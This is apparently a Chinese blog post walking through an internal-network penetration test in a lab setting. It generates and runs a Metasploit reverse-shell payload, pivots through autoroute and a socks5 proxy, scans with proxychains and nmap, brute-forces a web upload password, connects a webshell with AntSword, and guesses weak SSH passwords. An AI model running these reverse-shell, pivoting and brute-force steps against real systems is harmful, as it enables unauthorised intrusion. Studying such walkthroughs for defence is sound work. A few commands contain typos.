> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/CLlO09ZtskM3HdBmc-dQiQ)

![](https://mmbiz.qpic.cn/mmbiz_svg/uHwLXtyH4IXTars0DEAdy9nZcUtFcGrTy3nibexVh7BkBPMPp5nLfNgt67b5GWcgVibZsbUSHhKbtb6Eibh4vBoiaLfySz3fSygp/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/dx4Y70y9Xcs692v9TjnicxJEZft7mP8uWicBRPuXXzZg069MvuoD4NP9L3WJiaoqponicCib5DMjypusYpLvEsR5g11bPZsUtwfjB/640?wx_fmt=svg)

  

  

  

  

声明：本人坚决反对利用文章内容进行恶意攻击行为，一切错误行为必将受到惩罚，绿色网络需要靠我们共同维护，推荐大家在了解技术原理的前提下，更好的维护个人信息安全、企业安全、国家安全。  

  

  

  

  

![](https://mmbiz.qpic.cn/mmbiz_svg/GPyw0pGicibl6FlfJiaNBkMPMFyFOibLIWIcnofJD9HFIEkZM5SEbOlmbksIpNdHnJna42D5LSLYtEA7cbicE6qBeJv0fJ8eeZjfM/640?wx_fmt=svg)

![](https://mmbiz.qpic.cn/mmbiz_svg/ZqDaDiccbgkhBmJZvPXtaUAefuaoJCVTKXplxCtc9ibiav0toECE9GgicrEgxdtJOMFHDgLu3CN01gofEcWnI72wNtR2AicveephI/640?wx_fmt=svg)

0x01 **前言**

本‍‍‍‍次所使用的攻击机为 kali linux 系统，攻击过程中涉及到的工具主要有：中国菜刀 / 中国蚂剑，burpsuite，metasploit，MobaXterm，一句话木马，proxychains，nmap 脚本等。攻击的拓扑结构如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qk7ujDx2wvuiaSAMSGQbEPzZ89j9jRBrUpg4cH9WRQASsbuLH32nJaFcmvl9pNuyK1cCVN3mUkvtTg/640?wx_fmt=png)

0x02 ****反弹 Payload****

攻击机进行监听设置 (注意：监听主机设置需要与生成的 payload 保持一致)：

```
>>> use exploit/multi/handler
>>> set payloads linux/x64/meterpreter_reverse_tcp
>>> set LHOST 192.168.124.15        #监听主机ip地址
>>> set PORT 9999                  #监听主机端口号
>>> exploit -j
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIqic15tmJrSricWiah425ibyUH7iacnV3Naa9AoLGGyNpMVGOdXukaOxiaOB8g/640?wx_fmt=png)

生成反弹需要的 payload 文件：

```
>>> msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=IP LPORT =PORT -f elf > shell.elf
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIqhruVIicIDvpV2BPibxO8U59wDOujK3ZWT9e801Erw24XI9n0VbtHaiarw/640?wx_fmt=png)

将生成的文件上传到目标主机，并更改 payload 可执行权限，并执行。

```
>>> chmod 777 shell.elf
>>> ./shell.elf
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIqUgJdvhLf3hbGEBCfh6qjl4Kq7qM6KpGz0rkHk6qrjXwFFVZyutK8TQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIqThDqnJYK2b6KIpDb8FsXNCibsKXniaiaqgfMMBo77AWJ0icn1lia7RibDuqw/640?wx_fmt=png)

在攻击端，监听的主机收到目标主机反弹的 shell 权限，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIqEPl7OGjhmyQEkNnrw78Twr3Yq4gQ5pW8exU200uHCQMhb3MxiaJyEKQ/640?wx_fmt=png)

0x03 添加 socks5 代理

此时为了能够访问到内网，需要进行添加代理操作。查看当前路由有一个内网段 ip 地址段位 172.17.0.0/24。

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIqicicpSdZwvbE0e041EzHAibfVqAnF537SvOpeQdL8IT7iaYdO7DmTvINBQ/640?wx_fmt=png)

执行指令添加路由操作。

```
>>> run autoroute -s 172.17.0.0/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIq1Wia0ThVbCvsjU9NOXzVasCQqhhVm9JQHENtAP0cPG063JyiaCfALXNg/640?wx_fmt=png)

添加 socks5 代理：

```
>>> use auxiliary/server/socks5
>>> run
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIqB6HLSN1O95Yaq5b0ta4CPDQ1kza6YByrFD02qucd93YglN4ibbl5UZg/640?wx_fmt=png)

此处应用 proxychains 工具，进行内网探测，使用编辑器在文件 /etc/proxychains.conf 的最后一行加入 socks5 代理的配置信息。

| 

--- snippet ---

[ProxyList]

# add proxy here ...

# meanwile

# defaults set to "tor"

socks5  127.0.0.1 1080

 |

0x04 ******内网主机端口探测******

通过执行代理工具 proxychains，内网 web 服务进行探测，可以发现主机 ip 地址为 172.17.0.4。执行指令如下所示：

```
>>> Proxychains nmap 172.17.0.0/24 -sV  -sT  -Pn  -T 4 -p80
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIqX0DE7o8oPAiaic5BASDdazYmtFCk7ljjTJr4G0uSPDRE92a6PJB9FPTQ/640?wx_fmt=png)

0x05 ********内网 web 暴力破解********

此时通过浏览器是不能访问到内网服务器，需要在浏览器配置代理进行访问，配置代理类型选择 socks5，本地端口为 1080。配置好以后，就能通过代理访问内网主机的 web 应用了。

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIqh0ZibsFafvPMz9O7Nicntdjocdyzq3lt0w78cH1HEk9ibrMca5icxnibZTA/640?wx_fmt=png)

通过浏览页面可发现，为一个文件上传页面，但是上传需要输入口令，方可操作成功。此时考虑可通过 burpsuite 进行拦截后，口令破解。

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIq68ILfPrhVE2sAyLGjaicCfmbQic61DLHRlH6ERQpBDcG35Fz0jpOgZrQ/640?wx_fmt=png)

打开 burpsuite 后，需要添加代理，这样才能将拦截到的数据正确发送到目标服务器，配置过程如下所示：

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIqJPfaVkgxGXUvks2os5SFgEjXTjOpqheUd6dzEd6Ov41BJPLVYnV2iaw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIqiajEYTGUUldgEtdWIrAOCLOy5hVZAcfSkUHVkTz1hLl15eRicBO2RoaA/640?wx_fmt=png)

对拦截的数据更改口令字段，添加常用字典，此处用的字典为：top1000.txt。查看破解成功字段的真实口令为 password。

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIqopoGAsSZwf4VM1IDBw7rc4z1wqGOPYZx7eCnM2W55QLU84XRibHbqTA/640?wx_fmt=png)

0x06 **内网上传 webshell**

常用的菜刀，Cknife 等工具并不存在代理功能，此处使用中国蚁剑工具进行连接，配置蚁剑代理如下所示：

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIqCgs66Z7VicsYdbeFxAhruIhSyibnRB6uCl96uQlrP3CQsibqpib4TJ4faw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIqBiaogJtM7nMUp7WjwQcGBOtS7bVCMEL8JSoAIMaoxouHibicEq45iaU5jg/640?wx_fmt=png)

成功连接到内网的 shell 后，访问目标系统不同目录

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIqTX6EicYCSwnS7UIxwiaibicgzYY9a1zH7fMFrbcnaLooXkoicqwic5xr6EpQ/640?wx_fmt=png)

0x07 远程连接内网主机 SSH 服务

对内网的 22 端口进行探测，发现主机 172.17.0.8 开放 22 端口，并对该内网主机进行 ssh 弱口令猜解。

```
>>> proxychains nmap -sV -t -Pn -p22 127.17.0.0/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIq4fC4WECUg9D6jiaEPjLc7BkyL2hYKtPorUib9XQiaSKXuyRN340UwztKQ/640?wx_fmt=png)

通过第三方工具 MobaXterm 添加代理后，远程连接到内网主机，具体操作过程如下所示：

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIqibWcju593AiaDyMFRx0Jku0HWwAHFkLibsluh1BclJQMbJ4cIufmPeichg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qmQibmCISsCuGqjiaImQSJkIqYLicbNVyu6leD1UA3ANwFRhDmIrh1LB4RyRBvg8gomibMBjSFcWDQoAg/640?wx_fmt=png)

**【推荐书籍】**